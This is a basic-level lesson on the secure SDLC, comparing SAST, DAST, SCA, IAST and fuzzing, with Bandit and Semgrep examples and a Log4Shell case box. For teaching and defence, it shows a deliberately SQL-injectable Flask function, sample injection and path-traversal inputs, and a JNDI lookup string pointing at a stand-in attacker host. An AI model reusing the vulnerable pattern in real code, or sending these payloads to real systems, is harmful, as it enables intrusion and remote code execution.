---
id: secp-secure-sdlc
title: The secure SDLC, SAST and DAST
level: basic
minutes: 12
summary: Building security into every phase of development rather than bolting it on at the end, and what static analysis, dynamic scanning, dependency scanning and fuzzing each can and cannot find.
---

Many vulnerabilities arise from ordinary bugs (a string glued into a SQL query, a missing permission check, a debug endpoint left on) that nobody looked for at the right moment. The **secure software development life cycle (secure SDLC)** is the idea that security is a property of *how you build software*, not a test you run the week before launch.

Consider an illustrative late-review process: developers build for six months, a security team pen-tests for two weeks, finds forty issues, and the release slips or ships anyway. The secure SDLC spreads that work across every phase, using automation and human review, aiming to reduce the cost and exposure of late discovery.

## Why "shift left"

**Shifting left** means moving security checks earlier in the timeline, towards the developer's keyboard. The reasons are practical:

- **Context.** A developer fixing a SAST finding on their own pull request remembers the code. Six months later, someone else has to rediscover it.
- **Blast radius.** A flaw in a design document costs an edit. The same flaw shipped to 10,000 customers costs a patch, a disclosure and perhaps a breach.
- **Feedback loops.** Developers learn from fast feedback. Timely actionable feedback can be easier to apply than a delayed report; either format can still teach.

> [!note] About the "100× cheaper" statistic
> You will often see a claim that a bug costs 100 times more to fix in production than in design, attributed to IBM. The original source is hard to trace and the exact multiplier is not well supported. Earlier discovery can avoid downstream rework, but actual cost depends on the defect and project. No universal multiplier is asserted here.

## The phases and their security activities

| Phase | Security activity |
|---|---|
| Requirements | Security requirements, abuse cases |
| Design | Threat modelling, design review |
| Build | Secure coding, review, SAST, SCA |
| Test | DAST, fuzzing, pen testing |
| Release | Signing, SBOM, config review |
| Operate | Monitoring, patching, incident response |

A few of these deserve a word:

- **Abuse cases** are user stories written from the attacker's side: "As an attacker, I want to reset another user's password by guessing the token." They turn vague worries into testable requirements.
- **Threat modelling** (STRIDE, attack trees; see the fundamentals module) happens at design time, when changing direction is cheap.
- **Security requirements** can be taken from a checklist such as the **OWASP Application Security Verification Standard (ASVS)**, which lists concrete, testable controls at three levels of rigour.

You do not have to invent the process. **Microsoft's Security Development Lifecycle** (made mandatory internally in 2004, after Bill Gates's 2002 "Trustworthy Computing" memo) is one prominent large-scale example; no claim of historical priority is made here. Today the **NIST Secure Software Development Framework** (SP 800-218) and **OWASP SAMM** describe the practices and let you measure how mature you are.

## SAST: reading the code

**Static application security testing (SAST)** analyses source code (or bytecode) without running it. Tools include Semgrep, CodeQL, SonarQube and, for Python, Bandit.

The simplest SAST tools match patterns: "flag any call to `eval`". Better tools do **taint analysis**. They track data from **sources** (things an attacker controls) to **sinks** (dangerous operations), and raise an alert if tainted data reaches a sink without passing through a **sanitiser**.

```
 source        propagation       sink
 request.args -> name -> q -> execute()
                    ^
           no sanitiser on path
               => ALERT
```

Here is vulnerable code that a suitably configured taint rule can flag:

```python
from flask import request
import sqlite3

def search():
    name = request.args.get("name")
    db = sqlite3.connect("shop.db")
    q = ("SELECT * FROM items "
         f"WHERE name = '{name}'")
    return db.execute(q).fetchall()
```

The fix is a parameterised query, which keeps the data out of the SQL grammar entirely:

```python
    q = "SELECT * FROM items WHERE name = ?"
    return db.execute(q, (name,)).fetchall()
```

Bandit's B608 documentation illustrates a finding in this form; exact output and confidence depend on code shape and tool version:

```
>> Issue: [B608:hardcoded_sql_expressions]
   Possible SQL injection vector through
   string-based query construction.
   Severity: Medium   Confidence: Low
```

Note the "Confidence: Low". Bandit only sees that a string containing SQL keywords was built by formatting; it does not know whether `name` came from a user. A taint-tracking tool such as CodeQL, or a Semgrep taint rule, can be more precise:

```
rules:
  - id: flask-sqli
    languages: [python]
    severity: ERROR
    message: SQL built from request data
    mode: taint
    pattern-sources:
      - pattern: flask.request.$X
    pattern-sinks:
      - patterns:
          - pattern: $DB.execute($Q, ...)
          - focus-metavariable: $Q
```

This illustrative rule focuses the sink on the *query* argument, so bound data in a separate parameter argument should not create this SQL-text finding. Validate the rule against positive and negative examples for your Semgrep version; this review did not execute the Semgrep engine.

### Strengths and limits of SAST

- **Runs early and fast**, on every pull request, before anything is deployed.
- **Points at the exact line**, which makes fixes easy.
- **Covers code paths tests never reach**, by reasoning about paths without executing them, but practical analyses approximate behavior and may miss paths or flows.
- **False positives.** It cannot always tell whether a value is really attacker-controlled or already validated. Noisy tools get ignored.
- **False negatives.** It struggles with things that are not visible in code: misconfigured servers, logic flaws ("a user can approve their own expense claim"), or data flowing through reflection, queues and other services.

## DAST: attacking the running app

**Dynamic application security testing (DAST)** treats the application as a black box. It crawls a running instance, then sends malicious inputs (`' OR 1=1--`, `<script>`, `../../etc/passwd`) and inspects the responses. OWASP ZAP and Burp Suite are the best-known tools.

DAST can observe runtime manifestations of problems such as:

- Missing security headers (`Content-Security-Policy`, `Strict-Transport-Security`).
- Cookies without `Secure` or `HttpOnly`.
- Verbose error pages that leak stack traces.
- Injection flaws that are actually exploitable, end to end.

Its limits mirror SAST's. It needs a deployed environment, so it runs later. It only tests what it can reach, so pages behind logins, multi-step forms or single-page-app routing are often missed unless you configure authentication and seed URLs. And when it finds a bug, it usually reports the request/endpoint rather than a reliable source-code location, unless integrated instrumentation provides one.

## SCA, IAST and fuzzing

Three more techniques complete the picture.

- **Software composition analysis (SCA)** checks your *dependencies* against databases of known vulnerabilities. Tools include Dependabot, `pip-audit`, Snyk and OWASP Dependency-Check. The next lesson covers this in depth.
- **Interactive testing (IAST)** instruments the running app, so when DAST or a functional test sends a payload, an agent inside the process sees exactly which line it reached. It combines DAST's realism with SAST's precision, at the cost of an agent per language runtime.
- **Fuzzing** throws huge numbers of random or mutated inputs at a parser and watches for crashes. It is extremely good at memory-safety bugs. **Heartbleed** (2014, OpenSSL) was found independently by a Google engineer reviewing code and by the security firm Codenomicon using its own fuzz-testing tools. Google's **OSS-Fuzz** has since found thousands of vulnerabilities in open-source projects.

| Technique | Needs | Best at |
|---|---|---|
| SAST | Source | Injection, unsafe APIs |
| DAST | Running app | Config, headers, real exploits |
| SCA | Dependency list | Known CVEs in libraries |
| Fuzzing | Harness | Parser and memory bugs |

> [!example] Log4Shell and the limits of SAST
> In December 2021, Log4Shell (CVE-2021-44228) could enable remote code execution in affected Log4j Core configurations when attacker-controlled input such as `${jndi:ldap://evil.example/a}` reached a vulnerable lookup path. A scan limited to application code and lacking relevant dependency/flow models might miss the problem: calling `log.info(userAgent)` is normal. The flaw lived in the Log4j library, in a lookup feature added back in 2013. Teams with an accurate dependency inventory could identify candidate exposure more directly than those reconstructing one during the incident. Comparative hour/week response-time claims are omitted because this review did not obtain supporting incident data.

## Putting it in a pipeline

```
 commit ──> pre-commit: secret scan
   │
 pull req ─> SAST + SCA (risk-based gates)
   │         + human code review
 merge ──> build, sign, SBOM
   │
 staging ─> DAST baseline scan
   │
 release ─> monitor, patch, respond
```

Some practical rules:

1. **Use risk-based build gates.** Baseline and triage existing findings, gate actionable new issues, and escalate severe existing vulnerabilities rather than exempting them merely because they are old. A gate that fails on 3,000 legacy warnings gets switched off.
2. **Tune rules.** Disable checks that never find anything real in your codebase; add custom rules for your own dangerous patterns.
3. **Put results where developers work**: as PR comments, not in a separate dashboard nobody opens.
4. **Use security champions**: one developer per team with extra training, who triages findings and is the first port of call. It scales far better than a central team reviewing everything.
5. **Keep humans in the loop.** Code review and threat modelling find logic and design flaws that generic scanners may miss without the relevant security requirements and models.

## Common pitfalls

- **Tools as a checkbox.** Running a scanner for compliance and never reading the output adds cost and no security.
- **Treating "no findings" as "secure".** Each tool has blind spots; absence of evidence is not evidence of absence.
- **Security as gatekeeper.** If the security team is a bottleneck that says "no", teams route around it. Paved roads (secure defaults, approved libraries, templates) work better than gates.
- **Skipping design.** A generic scanner may miss a non-expiring password-reset token; custom rules, framework checks and targeted dynamic tests can detect some such flaws.

## Key takeaways
- A secure SDLC builds security into requirements, design, coding, testing, release and operations rather than bolting it on at the end.
- Earlier checks can reduce downstream rework while context is fresh; costs depend on the defect and project.
- SAST reads code and traces tainted data from sources to sinks; it can run early, but precision and coverage depend on the tool, rules and program.
- DAST attacks a running app from outside; it finds config and real exploitable flaws but runs later and only tests what it can reach.
- SCA covers dependencies, which is where Log4Shell lived; fuzzing finds parser and memory bugs.
- Prioritise actionable findings, make results accessible to developers and define risk-based escalation for severe existing issues.

## Further reading
- [NIST SP 800-218: Secure Software Development Framework](https://csrc.nist.gov/pubs/sp/800/218/final)
- [OWASP SAMM](https://owasp.org/www-project-samm/)
- [OWASP Application Security Verification Standard](https://owasp.org/www-project-application-security-verification-standard/)
- [Semgrep documentation](https://semgrep.dev/docs/)
- [Bandit documentation](https://bandit.readthedocs.io/en/latest/)
- [ZAP (Zed Attack Proxy)](https://www.zaproxy.org/)
- [OSS-Fuzz](https://google.github.io/oss-fuzz/)
- [Microsoft Security Development Lifecycle — Wikipedia](https://en.wikipedia.org/wiki/Microsoft_Security_Development_Lifecycle)
